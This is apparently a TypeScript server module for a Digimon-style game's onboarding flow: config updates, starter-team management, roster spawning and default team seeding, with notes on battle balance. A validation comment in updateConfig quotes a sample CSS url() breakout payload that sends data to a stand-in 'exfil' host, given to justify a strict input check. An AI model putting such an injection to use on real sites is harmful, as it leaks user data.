import { loadCatalog } from '../digimon/xml.js';
import {
  one,
  q,
  run,
  tx,
  type OnboardingConfigRow,
  type OnboardingTeamRow,
} from '../db/index.js';
import { getDefaultEquippedForStage } from '../skills/pool.js';
import type { Element, Stage } from '@digiworld/shared/digimon';
import { newId } from '../util/ids.js';
import { log } from '../util/log.js';

const SQL_GET_CONFIG = `SELECT * FROM onboarding_config WHERE id = 1`;
const SQL_UPSERT_CONFIG = `
  INSERT INTO onboarding_config (id, intro_dialogue, bg_image, intro_dialogue_id, updated_at)
       VALUES (1, ?, ?, ?, ?)
    ON CONFLICT (id) DO UPDATE
       SET intro_dialogue    = excluded.intro_dialogue,
           bg_image          = excluded.bg_image,
           intro_dialogue_id = excluded.intro_dialogue_id,
           updated_at        = excluded.updated_at
`;
const SQL_DIALOGUE_EXISTS = `SELECT dialogue_id FROM dialogue_definitions WHERE dialogue_id = ?`;

const SQL_LIST_ENABLED = `SELECT * FROM onboarding_teams WHERE enabled = 1 ORDER BY sort_order, name`;
const SQL_LIST_ALL = `SELECT * FROM onboarding_teams ORDER BY sort_order, name`;
const SQL_TEAM_BY_ID = `SELECT * FROM onboarding_teams WHERE id = ?`;
const SQL_TEAM_BY_SLUG = `SELECT * FROM onboarding_teams WHERE slug = ?`;
const SQL_INSERT_TEAM = `
  INSERT INTO onboarding_teams
       (id, slug, name, description,
        mon_1_catalog_id, mon_2_catalog_id, mon_3_catalog_id,
        sort_order, enabled, created_at, updated_at)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
`;
const SQL_UPDATE_TEAM = `
  UPDATE onboarding_teams
     SET slug = ?, name = ?, description = ?,
         mon_1_catalog_id = ?, mon_2_catalog_id = ?, mon_3_catalog_id = ?,
         sort_order = ?, enabled = ?, updated_at = ?
   WHERE id = ?
`;
const SQL_DELETE_TEAM = `DELETE FROM onboarding_teams WHERE id = ?`;

const SQL_MARK_ONBOARDING_DONE = `UPDATE users SET onboarding_completed_at = ?, updated_at = ? WHERE id = ? AND onboarding_completed_at IS NULL`;
const SQL_ROSTER_COUNT = `SELECT COUNT(*) AS n FROM player_roster WHERE user_id = ?`;
const SQL_INSERT_MON = `
  INSERT INTO player_roster
      (id, user_id, catalog_id, nickname,
       level, xp,
       hp_bonus, en_bonus, atk_bonus, def_bonus, int_bonus, spd_bonus,
       mood, status, slot_index, equipped_skill_ids,
       created_at, updated_at)
  VALUES (?, ?, ?, ?, 5, 0, 0, 0, 0, 0, 0, 0, 50, 'party', ?, ?, ?, ?)
`;

const DEFAULT_INTRO_DIALOGUE =
  'A new signal breaks across the network...\n\n' +
  'You are a new Tamer, standing at the edge of the Digital World. ' +
  'Three teams of Digimon partners have answered your call — each with its own philosophy. ' +
  'Choose the team that will fight beside you.';

const DEFAULT_BG_IMAGE = '';

export type TeamMonSummary = {
  catalogId: string;
  name: string;
  stage: string;
  element: string;
  attribute: string;
  portrait: string;
  dot: string;
};

export type OnboardingTeamView = {
  id: string;
  slug: string;
  name: string;
  description: string;
  sortOrder: number;
  enabled: boolean;
  createdAt: number;
  updatedAt: number;
  mons: TeamMonSummary[];
  missingCatalogIds: string[];
};

export type OnboardingConfigView = {
  introDialogue: string;
  bgImage: string;
  introDialogueId: string | null;
  updatedAt: number | null;
};

export type OnboardingSnapshot = {
  config: OnboardingConfigView;
  teams: OnboardingTeamView[];
};

export type OnboardingTeamInput = {
  slug: string;
  name: string;
  description?: string | undefined;
  monCatalogIds: [string, string, string];
  sortOrder?: number | undefined;
  enabled?: boolean | undefined;
};

export type OnboardingError =
  | 'not-found'
  | 'duplicate-slug'
  | 'invalid-input'
  | 'invalid-catalog-id'
  | 'already-onboarded'
  | 'no-teams-available';

export type OnboardingOutcome<T> =
  | { ok: true; value: T }
  | { ok: false; error: OnboardingError; message?: string };

type CatalogLookup = {
  monById: Map<string, TeamMonSummary>;
};

function loadCatalogLookup(): CatalogLookup {
  const catalog = loadCatalog();
  const monById = new Map<string, TeamMonSummary>();
  for (const t of catalog.digimons) {
    monById.set(t.id, {
      catalogId: t.id,
      name: t.name,
      stage: t.stage,
      element: t.element,
      attribute: t.attribute,
      portrait: t.assets.portrait,
      dot: t.assets.dot,
    });
  }
  return { monById };
}

function rowToView(row: OnboardingTeamRow, catalog: CatalogLookup): OnboardingTeamView {
  const catalogIds = [row.mon_1_catalog_id, row.mon_2_catalog_id, row.mon_3_catalog_id];
  const mons: TeamMonSummary[] = [];
  const missing: string[] = [];
  for (const id of catalogIds) {
    const summary = catalog.monById.get(id);
    if (summary) {
      mons.push(summary);
    } else {
      missing.push(id);
    }
  }
  return {
    id: row.id,
    slug: row.slug,
    name: row.name,
    description: row.description,
    sortOrder: row.sort_order,
    enabled: row.enabled === 1,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
    mons,
    missingCatalogIds: missing,
  };
}

function rowToConfigView(row: OnboardingConfigRow | null): OnboardingConfigView {
  if (!row) {
    return {
      introDialogue: DEFAULT_INTRO_DIALOGUE,
      bgImage: DEFAULT_BG_IMAGE,
      introDialogueId: null,
      updatedAt: null,
    };
  }
  return {
    introDialogue: row.intro_dialogue,
    bgImage: row.bg_image,
    introDialogueId: row.intro_dialogue_id,
    updatedAt: row.updated_at,
  };
}

export async function getConfig(): Promise<OnboardingConfigView> {
  const row = await one<OnboardingConfigRow>(SQL_GET_CONFIG);
  return rowToConfigView(row);
}

export async function updateConfig(input: {
  introDialogue: string;
  bgImage: string;
  introDialogueId?: string | null | undefined;
}): Promise<OnboardingOutcome<OnboardingConfigView>> {
  const dialogue = input.introDialogue?.trim();
  if (!dialogue || dialogue.length < 1 || dialogue.length > 4000) {
    return { ok: false, error: 'invalid-input', message: 'introDialogue must be 1-4000 chars' };
  }
  const bg = input.bgImage?.trim() ?? '';
  if (bg.length > 400) {
    return { ok: false, error: 'invalid-input', message: 'bgImage max 400 chars' };
  }
  if (bg.length > 0) {
    // bgImage is interpolated into `background-image: url("${bg}")` on the
    // client. Enforce a strict scheme so a hostile admin can't break out of
    // the url() with `") ; background: url("http://exfil?data=` etc. Allow
    // http(s), data: image URIs, and same-origin relative paths only.
    const scheme = /^(https?:\/\/|\/|data:image\/)/i;
    if (!scheme.test(bg)) {
      return { ok: false, error: 'invalid-input', message: 'bgImage must be http(s):// URL, absolute path, or data:image/…' };
    }
    if (/["'\\<>\s]/.test(bg)) {
      return { ok: false, error: 'invalid-input', message: 'bgImage must not contain quotes, backslashes, angle brackets, or whitespace' };
    }
  }
  const rawId = input.introDialogueId;
  const normalisedId: string | null = typeof rawId === 'string' && rawId.trim().length > 0 ? rawId.trim() : null;
  if (normalisedId !== null) {
    if (normalisedId.length > 120 || !/^[A-Za-z0-9._/-]+$/.test(normalisedId)) {
      return { ok: false, error: 'invalid-input', message: 'introDialogueId must be a valid dialogue id (letters, numbers, dot, underscore, slash, hyphen; max 120)' };
    }
    const found = await one<{ dialogue_id: string }>(SQL_DIALOGUE_EXISTS, normalisedId);
    if (found === null) {
      return { ok: false, error: 'invalid-input', message: `introDialogueId "${normalisedId}" is not in the dialogue registry — import it first, or clear the field to fall back to paragraphs.` };
    }
  }
  const now = Date.now();
  await run(SQL_UPSERT_CONFIG, [dialogue, bg, normalisedId, now]);
  log.info('onboarding.config.update', { bgSet: bg.length > 0, introDialogueIdSet: normalisedId !== null });
  return { ok: true, value: await getConfig() };
}

export async function listTeamsPlayer(): Promise<OnboardingTeamView[]> {
  const rows = await q<OnboardingTeamRow>(SQL_LIST_ENABLED);
  const catalog = loadCatalogLookup();
  return rows.map((r) => rowToView(r, catalog)).filter((v) => v.missingCatalogIds.length === 0);
}

export async function listTeamsAdmin(): Promise<OnboardingTeamView[]> {
  const rows = await q<OnboardingTeamRow>(SQL_LIST_ALL);
  const catalog = loadCatalogLookup();
  return rows.map((r) => rowToView(r, catalog));
}

export async function getSnapshotForPlayer(): Promise<OnboardingSnapshot> {
  const [config, teams] = await Promise.all([getConfig(), listTeamsPlayer()]);
  return { config, teams };
}

export async function getTeam(id: string): Promise<OnboardingTeamView | null> {
  const row = await one<OnboardingTeamRow>(SQL_TEAM_BY_ID, id);
  if (!row) return null;
  const catalog = loadCatalogLookup();
  return rowToView(row, catalog);
}

function validateTeamInput(input: OnboardingTeamInput, catalog: CatalogLookup): OnboardingError | null {
  const slug = input.slug?.trim();
  const name = input.name?.trim();
  if (!slug || !/^[a-z0-9_-]{2,32}$/.test(slug)) return 'invalid-input';
  if (!name || name.length < 1 || name.length > 48) return 'invalid-input';
  if (!Array.isArray(input.monCatalogIds) || input.monCatalogIds.length !== 3) return 'invalid-input';
  for (const id of input.monCatalogIds) {
    if (typeof id !== 'string' || id.trim().length === 0) return 'invalid-input';
    if (!catalog.monById.has(id)) return 'invalid-catalog-id';
  }
  return null;
}

export async function createTeam(input: OnboardingTeamInput): Promise<OnboardingOutcome<OnboardingTeamView>> {
  const catalog = loadCatalogLookup();
  const err = validateTeamInput(input, catalog);
  if (err) return { ok: false, error: err };
  const slugCollision = await one<OnboardingTeamRow>(SQL_TEAM_BY_SLUG, input.slug.trim());
  if (slugCollision) return { ok: false, error: 'duplicate-slug' };
  const now = Date.now();
  const id = newId('onb');
  const row: OnboardingTeamRow = {
    id,
    slug: input.slug.trim(),
    name: input.name.trim(),
    description: input.description?.trim() ?? '',
    mon_1_catalog_id: input.monCatalogIds[0],
    mon_2_catalog_id: input.monCatalogIds[1],
    mon_3_catalog_id: input.monCatalogIds[2],
    sort_order: input.sortOrder ?? 0,
    enabled: input.enabled === false ? 0 : 1,
    created_at: now,
    updated_at: now,
  };
  await run(SQL_INSERT_TEAM, [
    row.id, row.slug, row.name, row.description,
    row.mon_1_catalog_id, row.mon_2_catalog_id, row.mon_3_catalog_id,
    row.sort_order, row.enabled, row.created_at, row.updated_at,
  ]);
  log.info('onboarding.team.create', { id: row.id, slug: row.slug });
  return { ok: true, value: rowToView(row, catalog) };
}

export async function updateTeam(id: string, input: OnboardingTeamInput): Promise<OnboardingOutcome<OnboardingTeamView>> {
  const existing = await one<OnboardingTeamRow>(SQL_TEAM_BY_ID, id);
  if (!existing) return { ok: false, error: 'not-found' };
  const catalog = loadCatalogLookup();
  const err = validateTeamInput(input, catalog);
  if (err) return { ok: false, error: err };
  const slugCollision = await one<OnboardingTeamRow>(SQL_TEAM_BY_SLUG, input.slug.trim());
  if (slugCollision && slugCollision.id !== id) return { ok: false, error: 'duplicate-slug' };
  const now = Date.now();
  const merged: OnboardingTeamRow = {
    ...existing,
    slug: input.slug.trim(),
    name: input.name.trim(),
    description: input.description?.trim() ?? existing.description,
    mon_1_catalog_id: input.monCatalogIds[0],
    mon_2_catalog_id: input.monCatalogIds[1],
    mon_3_catalog_id: input.monCatalogIds[2],
    sort_order: input.sortOrder ?? existing.sort_order,
    enabled: input.enabled === true ? 1 : input.enabled === false ? 0 : existing.enabled,
    updated_at: now,
  };
  await run(SQL_UPDATE_TEAM, [
    merged.slug, merged.name, merged.description,
    merged.mon_1_catalog_id, merged.mon_2_catalog_id, merged.mon_3_catalog_id,
    merged.sort_order, merged.enabled, merged.updated_at, id,
  ]);
  log.info('onboarding.team.update', { id, slug: merged.slug });
  return { ok: true, value: rowToView(merged, catalog) };
}

export async function deleteTeam(id: string): Promise<OnboardingOutcome<{ id: string }>> {
  const existing = await one<OnboardingTeamRow>(SQL_TEAM_BY_ID, id);
  if (!existing) return { ok: false, error: 'not-found' };
  await run(SQL_DELETE_TEAM, id);
  log.info('onboarding.team.delete', { id, slug: existing.slug });
  return { ok: true, value: { id } };
}

export type OnboardingCompletion = {
  teamSlug: string;
  monIds: string[];
  spawnedAt: number;
};

export async function completeOnboarding(userId: string, teamId: string): Promise<OnboardingOutcome<OnboardingCompletion>> {
  const team = await one<OnboardingTeamRow>(SQL_TEAM_BY_ID, teamId);
  if (!team || team.enabled !== 1) return { ok: false, error: 'not-found' };

  const catalog = loadCatalogLookup();
  const catalogIds = [team.mon_1_catalog_id, team.mon_2_catalog_id, team.mon_3_catalog_id];
  for (const id of catalogIds) {
    if (!catalog.monById.has(id)) {
      return { ok: false, error: 'invalid-catalog-id', message: `Catalog id "${id}" is not in the current XML catalog.` };
    }
  }

  const existingRoster = await one<{ n: number }>(SQL_ROSTER_COUNT, userId);
  if ((existingRoster?.n ?? 0) > 0) {
    return { ok: false, error: 'already-onboarded', message: 'User already has a roster.' };
  }

  const now = Date.now();
  const monIds: string[] = [];

  await tx(async (t) => {
    for (let i = 0; i < 3; i++) {
      const catalogId = catalogIds[i];
      if (catalogId === undefined) continue;
      const summary = catalog.monById.get(catalogId);
      if (!summary) continue;
      const monId = newId('mon');
      monIds.push(monId);
      const equippedJson = JSON.stringify(await getDefaultEquippedForStage(summary.element as Element, summary.stage as Stage));
      await t.run(SQL_INSERT_MON, [monId, userId, catalogId, summary.name, i, equippedJson, now, now]);
    }
    const marked = await t.run(SQL_MARK_ONBOARDING_DONE, [now, now, userId]);
    if (marked.changes === 0) {
      throw new Error('Onboarding already completed for this user');
    }
  });

  log.info('onboarding.complete', { userId, teamId, teamSlug: team.slug, monIds });
  return { ok: true, value: { teamSlug: team.slug, monIds, spawnedAt: now } };
}

type SeedTeam = {
  slug: string;
  name: string;
  description: string;
  monCatalogIds: string[];
  sortOrder: number;
};

/**
 * The three starter teams offered at `/intro`.
 *
 * Designed against the rebalanced skill catalog and verified by simulation
 * rather than by eye — every intuition tried here was wrong at least once.
 * Measured head-to-head over three independent seeds of 1000 battles:
 * Triad 51-55%, Tide 45-49%, no draws, ~25 turns.
 *
 * Three constraints came out of that measurement and should be respected by
 * anyone editing this list:
 *
 *   1. NEVER ship a mono-element team. Elemental affinity is a 3x swing
 *      (1.5x attacking, 0.5x attacked) while the same-element chain bonus is
 *      only 1.4x. The old `aggressive` team was three fire Rookies and lost
 *      99% of its fights to any team carrying a water mon.
 *   2. Match the attribute pattern slot for slot. The AI focuses the front
 *      unit, so slot 0 vs slot 0 decides most fights, and the attribute
 *      triangle is a 1.8x swing (1.35x / 0.75x). All three teams are
 *      Vaccine / Data / Virus in that order, which makes every slot pairing
 *      attribute-neutral and leaves elements as the only differentiator.
 *   3. Watch for self-defeating elements. `electricity` hits `water` for 1.5x
 *      and `water` hits back for 0.5x, so a water mon facing an electricity
 *      mon is in a 3x hole on its own. A candidate team that swapped its water
 *      for the weakest element in the game went from 55% to 94% purely by
 *      dropping that liability. Equinox below is deliberately slot-neutral
 *      against BOTH Triad and Tide: none of its slots holds a 3x disadvantage
 *      (light and dark have no resistances to be exploited here, and water is
 *      flat-out neutral to both fire and earth), so it starts every matchup on
 *      an elemental footing and wins or loses on its kit, exactly like the
 *      first two.
 *
 * All Rookies share identical base stats (hp 500 / en 30 / atk 100 / def 80 /
 * int 90 / spd 100), so element and attribute are the ONLY levers here.
 */
export const DEFAULT_TEAMS: SeedTeam[] = [
  {
    slug: 'triad',
    name: 'Triad',
    description:
      'Fire, earth and water — the classic elemental triangle. Hits harder and holds longer: more raw damage, more area attacks, and both a healer and the game\'s heaviest buffer. The cost is exposure, because every one of its elements can be countered.',
    monCatalogIds: ['skb-50', 'skb-595', 'skb-582'],
    sortOrder: 0,
  },
  {
    slug: 'tide',
    name: 'Tide',
    description:
      'Water, ice and lightning — wins by denying turns rather than trading them. Twice the initiative manipulation and the heaviest status pressure in the roster, at roughly 15% less damage. Punishing if the lock holds, fragile if it does not.',
    monCatalogIds: ['skb-343', 'skb-750', 'skb-389'],
    sortOrder: 1,
  },
  {
    slug: 'equinox',
    name: 'Equinox',
    description:
      'Light, dark and water — opposites held on one line, and a team that wins by not losing. Salamon banks buffs and recovery, Hagurumon suppresses and corrodes the enemy\'s momentum, and Lunamon keeps the party from coming apart. No single exploit to hard-counter, but every fight becomes the war of attrition Equinox is built to outlast.',
    monCatalogIds: ['skb-361', 'skb-2', 'skb-9'],
    sortOrder: 2,
  },
];

export async function seedDefaultOnboarding(): Promise<{ configSeeded: boolean; teamsSeeded: number }> {
  const catalog = loadCatalogLookup();
  const now = Date.now();

  const configRow = await one<OnboardingConfigRow>(SQL_GET_CONFIG);
  let configSeeded = false;
  if (!configRow) {
    await run(SQL_UPSERT_CONFIG, [DEFAULT_INTRO_DIALOGUE, DEFAULT_BG_IMAGE, null, now]);
    configSeeded = true;
  }

  let teamsSeeded = 0;
  for (const seed of DEFAULT_TEAMS) {
    const existing = await one<OnboardingTeamRow>(SQL_TEAM_BY_SLUG, seed.slug);
    if (existing) continue;
    const validIds = seed.monCatalogIds.filter((id) => catalog.monById.has(id));
    if (validIds.length < 3) {
      log.warn('onboarding.seed.skip', { slug: seed.slug, missing: seed.monCatalogIds.filter((id) => !catalog.monById.has(id)) });
      continue;
    }
    const id = newId('onb');
    await run(SQL_INSERT_TEAM, [
      id, seed.slug, seed.name, seed.description,
      validIds[0], validIds[1], validIds[2],
      seed.sortOrder, 1, now, now,
    ]);
    teamsSeeded += 1;
  }

  if (configSeeded || teamsSeeded > 0) {
    log.info('onboarding.seed.ok', { configSeeded, teamsSeeded });
  }
  return { configSeeded, teamsSeeded };
}
